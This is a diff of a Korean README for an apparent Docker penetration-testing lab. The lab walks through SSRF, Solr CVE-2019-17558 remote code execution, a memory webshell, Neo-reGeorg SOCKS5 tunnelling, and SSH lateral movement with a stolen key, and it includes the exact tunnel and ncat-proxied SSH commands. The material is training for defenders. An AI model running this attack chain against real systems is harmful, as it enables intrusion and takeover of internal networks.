@@ -8,11 +8,11 @@
 
 | Zone | 서비스 | IP | 역할 |
 |------|--------|--------|------|
-| **DMZ Zone** | dmz-web (Nginx) | 172.16.1.10 | 외부 트래픽을 받는 웹 서버 |
-| **WAS Zone** | app-was (Tomcat 9.0) | 172.16.2.10 | 사용자 서비스 제공, `proxy.jsp` Solr API 프록시 |
+| **DMZ Zone** | dmz-web (Nginx) | 172.16.1.10 | 외부 트래픽을 받는 리버스 프록시 |
+| **WAS Zone** | app-was (Tomcat 9.0) | 172.16.2.10 | 사용자 서비스 제공, `proxy.jsp` SSRF 취약점 존재 |
 | **Search Zone** | search-solr (Solr 8.2.0) | 172.16.3.10 | 검색 엔진, **CVE-2019-17558** RCE 취약점 존재 |
 | **DB Zone** | db-server (MySQL 5.7) | 172.16.4.10 | 뉴스/지식포털 데이터 저장 |
-| **Internal Zone** | infra-monitor | 172.16.5.100 | 모니터링 솔루션 서버 |
+| **Internal Zone** | infra-monitor | 172.16.5.100 | 모니터링 서버 |
 
 ### Network Topology
 
@@ -36,36 +36,28 @@
   │  ┌──────────────────────────▼──────────────────┐                  │
   │  │ app-was (Tomcat 9.0) - 172.16.2.10:8080     │                  │
   │  │ └─ proxy.jsp (SSRF)                         │                  │
-  │  └───────┬──────────────────────────────┬──────┘                  │
-  └──────────┼──────────────────────────────┼─────────────────────────┘
-       JDBC  │                              │ SSRF
-   ┌─────────┼──────────────────────────────┼──────────────────────────┐
-   │         │   Search Zone (172.16.3.0/24)│                          │
-   │         │   ┌──────────────────────────▼─────────────────────┐    │
-   │         │   │ search-solr (Solr 8.2.0) - 172.16.3.10:8983    │    │
-   │         │   │ └─ CVE-2019-17558 (RCE)                        │    │
-   │         │   └─────────────────────────────────────┬──────────┘    │
-   └─────────┼─────────────────────────────────────────┼───────────────┘
-             │                                   Pivot │
-             ▼                                         ▼
-   ┌───────────────────────────────┐  ┌────────────────────────────────┐
-   │ DB Zone (172.16.4.0/24)       │  │ Internal Zone (172.16.5.0/24)  │
-   │ ┌───────────────────────────┐ │  │  ┌──────────────────────────┐  │
-   │ │ db-server (MySQL 5.7)     │ │  │  │ infra-monitor            │  │
-   │ │ 172.16.4.10:3306          │ │  │  │ 172.16.5.100 [TARGET]    │  │
-   │ └───────────────────────────┘ │  │  └─────────────┬────────────┘  │
-   └───────────────────────────────┘  └────────────────┼───────────────┘
-                                                       │ 2nd Pivot
-             ┌─────────────────────────────────────────┘
-             ▼
-   ┌──────────────────────────────────────────────────────────────────┐
-   │  Lateral Movement via Infra-Monitor                              │
-   │  → DB (172.16.4.10), Solr (172.16.3.10),                         │
-   │    WAS (172.16.2.10), DMZ (172.16.1.10)                          │
-   └──────────────────────────────────────────────────────────────────┘
+  │  └──────┬──────────────────────────────┬───────┘                  │
+  └─────────┼──────────────────────────────┼──────────────────────────┘
+       JDBC │                              │ SSRF
+  ┌─────────┼──────────────────────────────┼──────────────────────────┐
+  │         │   Search Zone (172.16.3.0/24)│                          │
+  │         │   ┌──────────────────────────▼─────────────────────┐    │
+  │         │   │ search-solr (Solr 8.2.0) - 172.16.3.10:8983    │    │
+  │         │   │ └─ CVE-2019-17558 (RCE)                        │    │
+  │         │   └──────────────────┬───────────────────┬─────────┘    │
+  └─────────┼──────────────────────┼───────────────────┼──────────────┘
+            │                Pivot │                   │ Pivot
+            ▼                      ▼                   ▼
+  ┌───────────────────────────────┐  ┌────────────────────────────────┐
+  │ DB Zone (172.16.4.0/24)       │  │ Internal Zone (172.16.5.0/24)  │
+  │ ┌───────────────────────────┐ │  │  ┌──────────────────────────┐  │
+  │ │ db-server (MySQL 5.7)     │ │  │  │ infra-monitor            │  │
+  │ │ 172.16.4.10:3306          │ │  │  │ 172.16.5.100 [TARGET]    │  │
+  │ └───────────────────────────┘ │  │  └──────────────────────────┘  │
+  └───────────────────────────────┘  └────────────────────────────────┘
 
-   ATTACK CHAIN:
-   [1] SSRF → [2] RCE (CVE-2019-17558) → [3] Memshell → [4] Pivot → [5] Infra-Monitor → [6] Lateral Movement
+  ATTACK CHAIN:
+  [1] SSRF → [2] RCE (CVE-2019-17558) → [3] Memshell → [4] Pivot → [5] Infra-Monitor
 ```
 
 ---
@@ -75,19 +67,6 @@
 ### 요구사항
 - Docker & Docker Compose
 - Python 3.10+
-- ncat (SSH 터널링용)
-
-#### Python 의존성 설치
-```bash
-$ pip install -r requirements.txt
-```
-
-#### ncat 설치
-| OS | 설치 명령어 |
-|----|-------------|
-| **macOS** | `brew install nmap` |
-| **Linux (Debian/Ubuntu)** | `apt install ncat` |
-| **Windows** | [Nmap 공식 사이트](https://nmap.org/download.html)에서 설치 후 PATH에 추가 |
 
 ### 실행 방법
 ```bash
@@ -99,14 +78,14 @@ $ docker-compose up --build -d
 
 ---
 
-## 실습에 사용될 스크립트
+## 익스플로잇 스크립트
 
 | 파일 | 설명 |
 |------|------|
 | `exploits/rce.py` | Velocity Template RCE 활성화 |
 | `exploits/upload_jar.py` | Base64 청크로 JAR 파일 업로드 |
 | `exploits/memshell.py` | URLClassLoader로 메모리에 악성 클래스 로드 |
-| `exploits/Neo-reGeorg/neoreg.py` | SOCKS5 via HTTP 터널링 도구 |
+| `exploits/Neo-reGeorg/` | SOCKS5 터널링 도구 |
 
 ---
 
@@ -149,6 +128,7 @@ $ python exploits/memshell.py
 멤쉘을 통해 SOCKS5 터널을 생성합니다.
 
 ```bash
+$ pip install requests
 $ cd exploits/Neo-reGeorg
 $ python neoreg.py -k key -H "Referer:Xljumsjp" -u "http://localhost/proxy.jsp?path=/solr/techboard/" -vv
 ```
@@ -184,33 +164,32 @@ $ proxychains curl http://172.16.5.100
 #### 5-4. 내부 서버 장악 (Lateral Movement)
 획득한 SSH 키로 모든 내부 서버에 접근 가능합니다.
 
-SOCKS5 프록시를 통한 SSH 접속
+SOCKS5 프록시를 통한 SSH 접속 (ncat 사용):
 
 ```bash
 # 키 권한 설정
 $ chmod 600 monitor_rsa.pem
-```
 
-**Step 1.** Infra-Monitor 서버 접속 및 2차 SOCKS5 터널 생성:
+# SSH ProxyCommand 방식 (ncat 필요: brew install nmap 또는 apt install ncat)
+# Infra-Monitor 서버 접속
+$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
+    -i monitor_rsa.pem monitor@172.16.5.100
 
-```bash
-$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" -i monitor_rsa.pem monitor@172.16.5.100 -D 5555 -fN
-```
+# DB 서버 접속 (infra-monitor 경유)
+$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
+    -i monitor_rsa.pem monitor@172.16.4.10
 
-**Step 2.** Infra-Monitor 경유 터널(5555)로 다른 내부 서버 접속:
+# Solr 서버 접속
+$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
+    -i monitor_rsa.pem monitor@172.16.3.10
 
-```bash
-# DB 서버
-$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:5555 --proxy-type socks5 %h %p" -i monitor_rsa.pem monitor@172.16.4.10
+# WAS 서버 접속
+$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
+    -i monitor_rsa.pem monitor@172.16.2.10
 
-# Solr 서버
-$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:5555 --proxy-type socks5 %h %p" -i monitor_rsa.pem monitor@172.16.3.10
-
-# WAS 서버
-$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:5555 --proxy-type socks5 %h %p" -i monitor_rsa.pem monitor@172.16.2.10
-
-# DMZ 서버
-$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:5555 --proxy-type socks5 %h %p" -i monitor_rsa.pem monitor@172.16.1.10
+# DMZ 서버 접속
+$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
+    -i monitor_rsa.pem monitor@172.16.1.10
 ```
 
 > **공격 성공!** 모니터링 솔루션 계정(`monitor`)으로 전체 내부 인프라 장악 완료
